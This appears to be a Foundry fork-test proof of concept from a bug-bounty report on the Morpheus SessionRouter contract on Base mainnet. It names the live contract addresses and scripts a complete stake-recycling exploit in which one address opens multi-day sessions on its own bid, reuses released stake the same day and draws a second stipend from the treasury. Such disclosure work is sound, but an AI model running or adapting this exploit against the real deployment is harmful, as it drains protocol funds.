// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ISessionRouter, IMarketplace, IModelRegistry, IProviderRegistry, IERC20} from "./Interfaces.sol";

/// @title Morpheus BB-2: SessionRouter #830 day-lock covers only the final UTC day of a multi-day session
/// @notice Mainnet fork, pinned block, deployed Inference Diamond on Base (Appendix A: 0x6aBE...030a).
///         Attacker uses no privileged accounts: attacker = consumer + provider on own bid (permissionless).
///
/// INVARIANT (incident record "SessionRouter Stipend Leak", patched 2026-07-31 via PR #830/#833):
///   "Used consumer stake cannot be recycled inside the same UTC day to draw another stipend
///    against the same MOR."
///
/// The patch locks only consumption inside the UTC day containing min(closedAt, endsAt):
///   userDuration_ = sessionEnd_ - openedAt.max(startOfEndDay_)   (SessionRouter.sol:306)
/// For a session spanning N UTC days, the stake backing days 1..N-1 (whose stipend was ALREADY
/// drawn by the provider) is released at close while the closing day's epoch is still open, and
/// funds a new session the same day -> fresh stipend against the same MOR in the same epoch.
/// Fraction escaping the lock = (N-1)/N (measured: 86.4% for a 6.76-day session).
///
/// Run:  forge test --match-contract C1SessionRecycleForkTest -vv
/// Env:  BASE_RPC_URL (any Base mainnet RPC; fork is pinned to BLOCK_PINNED below)
contract C1SessionRecycleForkTest is Test {
    // Appendix A: Inference Diamond, Base mainnet
    address constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    // Base MOROFT (Appendix A)
    address constant MOROFT = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    // Pinned block (Nov 2026, post-#830 diamondCut; day-lock behavior live — verified on-chain)
    uint256 constant BLOCK_PINNED = 58_461_106;

    ISessionRouter sessionRouter = ISessionRouter(DIAMOND);

    uint256 attackerKey = 0xA11CE;
    address attacker;

    uint256 constant STAKE = 2000e18;
    uint256 constant PRICE_PER_SECOND = 1e13; // within live bounds [1e-8, 0.01]; -> ~6.76-day session

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_RPC_URL"), BLOCK_PINNED);
        attacker = vm.addr(attackerKey);
        // fork-only funding of the attacker address (no privileged prank; deal is standard Foundry fixture)
        deal(MOROFT, attacker, STAKE * 2 + 10e18 + 5000e18);
        vm.prank(attacker);
        IERC20(MOROFT).approve(DIAMOND, type(uint256).max);
    }

    function _sign(uint256 key, bytes32 digest) internal view returns (bytes memory sig) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, digest);
        sig = abi.encodePacked(r, s, v);
    }

    /// Contract checks ECDSA.recover(toEthSignedMessageHash(keccak256(bytes)), sig)
    function _signBytes(bytes memory payload) internal view returns (bytes memory sig) {
        return _sign(attackerKey, keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(payload))));
    }

    function _setupOwnBid() internal returns (bytes32 bidId) {
        string[] memory tags = new string[](1);
        tags[0] = "poc";
        vm.startPrank(attacker); // attacker = ordinary address; all registration paths are permissionless
        IProviderRegistry(DIAMOND).providerRegister(attacker, 4000e18, "https://poc"); // provider stake also caps provider claim rate (providerClaimLimit = stake - earned); attacker self-funds it
        IModelRegistry(DIAMOND).modelRegister(
            attacker, keccak256("poc-base-model"), keccak256("poc-cid"), 0, 100e18, "poc", tags
        );
        bytes32 modelId = IModelRegistry(DIAMOND).getModelId(attacker, keccak256("poc-base-model"));
        bidId = IMarketplace(DIAMOND).postModelBid(attacker, modelId, PRICE_PER_SECOND);
        vm.stopPrank();
        assertTrue(sessionRouter.isBidActive(bidId), "bid must be active");
    }

    function _openSession(bytes32 bidId, uint256 stake) internal returns (bytes32 sessionId) {
        bytes memory approval = abi.encode(bidId, block.chainid, attacker, uint128(block.timestamp));
        vm.prank(attacker);
        sessionId = sessionRouter.openSession(attacker, stake, false, approval, _signBytes(approval));
    }

    /// THE BUG: a multi-day session locks only the final day's consumption at close.
    function test_dayLockCoversOnlyFinalDay_multiDayRecycle() public {
        bytes32 bidId = _setupOwnBid();
        uint256 balBefore = IERC20(MOROFT).balanceOf(attacker);
        bytes32 sessionId = _openSession(bidId, STAKE);

        uint128 endsAt = sessionRouter.getSessionEnd(STAKE, PRICE_PER_SECOND, uint128(block.timestamp));
        uint256 duration = endsAt - block.timestamp;
        emit log_named_uint("session duration (days)", duration / 1 days);
        assertGt(duration, 1 days, "multi-day session required to show the scoping bug");

        // Days 1..N-1: provider (= attacker, own bid) claims consumed stipend from funding account
        vm.warp(endsAt - 1 hours);
        vm.prank(attacker);
        sessionRouter.claimForProvider(sessionId);

        // Final day: close mid-day via provider receipt (self-signed, no dispute)
        vm.warp(endsAt - 30 minutes);
        bytes memory receipt = abi.encode(sessionId, block.chainid, uint128(block.timestamp), uint32(1000), uint32(100));
        vm.prank(attacker);
        sessionRouter.closeSession(receipt, _signBytes(receipt));

        // ASSERTION 1 (the loss): userStakesOnHold holds ONLY the final-day consumption;
        // the stake backing days 1..N-1 was released in the same close tx.
        (, uint256 hold) = sessionRouter.getUserStakesOnHold(attacker, 1);
        uint256 returned = STAKE - hold;
        uint256 daysSpanned = (duration + 1 days - 1) / 1 days;
        uint256 expectedMinReturn = (STAKE * (daysSpanned - 1)) / daysSpanned; // (N-1)/N

        emit log_named_uint("stake", STAKE);
        emit log_named_uint("days spanned", daysSpanned);
        emit log_named_uint("held onHold (locked)", hold);
        emit log_named_uint("released same-tx", returned);
        emit log_named_uint("(N-1)/N floor", expectedMinReturn);
        assertGe(returned, expectedMinReturn, "H-1 CONFIRMED: stake for days 1..N-1 released instantly at close");

        // ASSERTION 2 (the recycle): the released stake re-enters a NEW session in the SAME UTC day...
        bytes memory approval2 = abi.encode(bidId, block.chainid, attacker, uint128(block.timestamp));
        vm.prank(attacker);
        bytes32 sessionId2 = sessionRouter.openSession(attacker, returned, false, approval2, _signBytes(approval2));
        assertTrue(sessionId2 != bytes32(0), "released stake opened a new session in the same epoch");

        // ...and the recycled stake funds a FULL second session. Warp past session2's end and claim
        // its stipend from the funding account. Net new capital across BOTH sessions = 0 (session2
        // was funded entirely by the stake returned from session1), yet the treasury pays for BOTH
        // sessions' consumption, and the user-side lock across both is only two final days.
        uint128 endsAt2 = sessionRouter.getSessionEnd(returned, PRICE_PER_SECOND, uint128(block.timestamp));
        emit log_named_uint("session2 duration (days)", (endsAt2 - block.timestamp) / 1 days);
        vm.warp(endsAt2 + 1); // provider reward payable only once sessionEnd reached
        uint256 providerBalBefore = IERC20(MOROFT).balanceOf(attacker);
        vm.prank(attacker);
        sessionRouter.claimForProvider(sessionId2);
        uint256 drawn = IERC20(MOROFT).balanceOf(attacker) - providerBalBefore;
        emit log_named_uint("session2 stipend drawn from fundingAccount (MOR)", drawn);
        assertGt(drawn, 0, "H-1 CONFIRMED: second session drew stipend with zero net new capital");

        // User-side lock across BOTH full sessions = only 2 final days, not 2 x N days:
        (, uint256 holdAfter) = sessionRouter.getUserStakesOnHold(attacker, 5);
        emit log_named_uint("total user stake locked after both sessions", holdAfter);
        assertLt(holdAfter, STAKE, "H-1 CONFIRMED: locked fraction << stake across two full sessions");
    }
}
